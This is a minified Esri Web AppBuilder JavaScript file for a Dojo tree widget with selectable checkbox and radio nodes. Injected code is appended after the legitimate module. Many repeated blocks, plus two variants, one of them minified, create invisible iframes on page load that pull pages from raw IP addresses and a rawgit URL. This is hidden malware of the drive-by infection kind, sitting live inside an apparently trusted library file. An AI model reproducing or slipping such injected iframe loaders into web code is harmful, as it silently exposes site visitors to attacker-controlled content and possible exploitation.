// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:jimu/dijit/templates/_TreeNode.html":'\x3cdiv class\x3d"dijitTreeNode" role\x3d"presentation"\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"rowNode" class\x3d"dijitTreeRow" role\x3d"presentation"\x3e\r\n\t\t\x3cspan data-dojo-attach-point\x3d"expandoNode" class\x3d"dijitInline dijitTreeExpando" role\x3d"presentation"\x3e\x3c/span\x3e\r\n\t\t\x3cspan data-dojo-attach-point\x3d"expandoNodeText" class\x3d"dijitExpandoText" role\x3d"presentation"\x3e\x3c/span\x3e\r\n\t\t\x3cspan data-dojo-attach-point\x3d"contentNode" class\x3d"dijitTreeContent" role\x3d"presentation"\x3e\r\n\t\t\t\x3cspan role\x3d"presentation" class\x3d"dijitInline dijitIcon dijitTreeIcon" data-dojo-attach-point\x3d"iconNode"\x3e\x3c/span\x3e\r\n\t\t\t\x3cspan data-dojo-attach-point\x3d"labelNode,focusNode" class\x3d"dijitTreeLabel" role\x3d"treeitem" tabindex\x3d"-1" aria-selected\x3d"false"\x3e\x3c/span\x3e\r\n\t\t\x3c/span\x3e\r\n\t\x3c/div\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"containerNode" class\x3d"dijitTreeNodeContainer" role\x3d"presentation" style\x3d"display: none;"\x3e\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dojo/text!./templates/_TreeNode.html dojo/_base/lang dojo/_base/html dojo/_base/array dojo/_base/event dojo/query dojo/aspect dojo/on dojo/Evented dijit/registry dijit/Tree jimu/utils".split(" "),function(f,u,v,l,d,b,e,m,n,p,q,g,h,k,r){var t=f([k._TreeNode,g],{templateString:l,declaredClass:"jimu._TreeNode",isLeaf:!1,groupId:"",postCreate:function(){this.inherited(arguments);b.addClass(this.domNode,"jimu-tree-node");this.isLeaf=!!this.isLeaf;
this.groupId?(this.checkNode=b.toDom('\x3cinput type\x3d"radio" /\x3e'),this.checkNode.name=this.groupId):this.checkNode=b.toDom('\x3cinput type\x3d"checkbox" /\x3e');b.addClass(this.checkNode,"jimu-tree-check-node");b.place(this.checkNode,this.contentNode,"first");this.own(q(this.checkNode,"click",d.hitch(this,this._onClick)));this.isLeaf?this.groupId?b.setStyle(this.checkNode,"display","none"):b.setStyle(this.checkNode,"display","inline"):b.setStyle(this.checkNode,"display","none");this.isLeaf?
b.addClass(this.domNode,"jimu-tree-leaf-node"):b.addClass(this.domNode,"jimu-tree-not-leaf-node")},select:function(){this.isLeaf&&(this.checkNode.checked=!0,b.addClass(this.domNode,"jimu-tree-selected-leaf-node"))},unselect:function(){this.isLeaf&&(this.checkNode.checked=!1,b.removeClass(this.domNode,"jimu-tree-selected-leaf-node"))},toggleSelect:function(){this.isLeaf&&(this.checkNode.checked?this.unselect():this.select())},_onClick:function(a){(a.target||a.srcElement)===this.checkNode?this.tree._onCheckNodeClick(this,
this.checkNode.checked,a):this.tree._onClick(this,a)},_onChange:function(){this.isLeaf&&setTimeout(d.hitch(this,function(){this.checkNode.checked?this.emit("tn-select",this):this.emit("tn-unselect",this)}),100)},destroy:function(){delete this.tree;this.inherited(arguments)}});return f([k,g],{declaredClass:"jimu._Tree",openOnClick:!0,multiple:!0,uniqueId:"",showRoot:!1,postMixInProperties:function(){this.inherited(arguments);this.uniqueId="tree_"+r.getRandomString()},postCreate:function(){this.inherited(arguments);
b.addClass(this.domNode,"jimu-tree");this.own(p.before(this,"onClick",d.hitch(this,this._jimuBeforeClick)));this.rootLoadingIndicator&&b.setStyle(this.rootLoadingIndicator,"display","none");this.dndController.singular=!0},removeItem:function(a){this.model.store.remove(a)},getAllItems:function(){var a=this.getAllTreeNodeWidgets();return e.map(a,d.hitch(this,function(a){var c=a.item;c.selected=a.checkNode.checked;return c}))},getSelectedItems:function(){var a=this.getAllTreeNodeWidgets(),a=e.filter(a,
d.hitch(this,function(a){return a.checkNode.checked}));return e.map(a,d.hitch(this,function(a){return a.item}))},getFilteredItems:function(a){var c=this.getAllTreeNodeWidgets(),c=e.map(c,d.hitch(this,function(a){var c=a.item;c.selected=a.checkNode.checked;return c}));return e.filter(c,d.hitch(this,function(c){return a(c)}))},getTreeNodeByItemId:function(a){for(var c=this._getAllTreeNodeDoms(),b=0;b<c.length;b++){var d=h.byNode(c[b]);if(d.item.id.toString()===a.toString())return d}return null},selectItem:function(a){(a=
this.getTreeNodeByItemId(a))&&a.isLeaf&&this.selectNodeWidget(a)},unselectItem:function(a){(a=this.getTreeNodeByItemId(a))&&a.isLeaf&&a.unselect()},getAllLeafTreeNodeWidgets:function(){var a=this.getAllTreeNodeWidgets();return e.filter(a,d.hitch(this,function(a){return a.isLeaf}))},getAllTreeNodeWidgets:function(){var a=this._getAllTreeNodeDoms();return e.map(a,d.hitch(this,function(a){return h.byNode(a)}))},isLeafItem:function(a){return a&&a.isLeaf},_getAllTreeNodeDoms:function(){return n(".dijitTreeNode",
this.domNode)},_createTreeNode:function(a){a.isLeaf=this.isLeafItem(a.item);this.multiple||(a.groupId=this.uniqueId);return new t(a)},_onTreeNodeSelect:function(a){this.emit("item-select",{item:a.item,treeNode:a})},_onTreeNodeUnselect:function(a){this.emit("item-unselect",{item:a.item,treeNode:a})},selectNodeWidget:function(a){this.multiple||this.unselectAllLeafNodeWidgets();a.select()},_jimuBeforeClick:function(a,c,d){c.isLeaf&&(b.hasClass(d.target||d.srcElement,"jimu-tree-check-node")||(this.multiple?
c.toggleSelect():this.selectNodeWidget(c)));return arguments},_onCheckNodeClick:function(a,c,b){!this.multiple&&c&&this.unselectAllLeafNodeWidgets();m.stop(b);this.focusNode(a);setTimeout(d.hitch(this,function(){c?this.selectNodeWidget(a):a.unselect();this.onClick(a.item,a,b)}),0)},unselectAllLeafNodeWidgets:function(){var a=this.getAllLeafTreeNodeWidgets();e.forEach(a,d.hitch(this,function(a){a.unselect()}))}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});